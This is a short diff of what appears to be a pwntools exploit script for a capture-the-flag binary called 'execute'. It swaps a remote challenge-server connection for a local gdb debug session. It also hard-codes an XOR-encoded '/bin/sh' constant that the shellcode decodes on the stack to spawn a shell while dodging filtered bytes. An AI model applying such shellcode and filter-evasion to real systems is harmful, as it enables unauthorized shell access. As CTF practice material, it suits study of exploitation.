@@ -10,11 +10,11 @@ elf = ELF("./execute")
 
 
 #p = process("./execute")
-p = remote("94.237.54.218", 34642)
-#p = gdb.debug("./execute", '''
-#break *main
-#break *main+174
-#break *check+116''')
+#p = remote("94.237.54.218", 34642)
+p = gdb.debug("./execute", '''
+break *main
+break *main+174
+break *check+116''')
 
 file_name = 'flag.txt'
 length = 32
@@ -25,7 +25,7 @@ shellcode = '''
 mov rax, 0x2a2a2a2a2a2a2a2a
 push rax
 
-mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
+mov rax, 0x2a42590544434805
 xor [rsp], rax
 mov rdi, rsp
 
